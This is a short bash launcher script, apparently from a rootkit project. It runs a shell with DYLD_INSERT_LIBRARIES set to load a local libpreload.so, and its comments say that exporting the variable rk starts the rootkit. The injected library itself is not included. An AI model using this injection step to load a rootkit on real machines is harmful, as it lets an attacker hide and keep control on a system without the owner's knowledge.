#!/bin/bash
# after running bash, export rk variable to start the rootkit
# ex:
#
# bash ~$ export rk=1
# bash ~$ 
#
DYLD_INSERT_LIBRARIES=`pwd`/libpreload.so /bin/bash
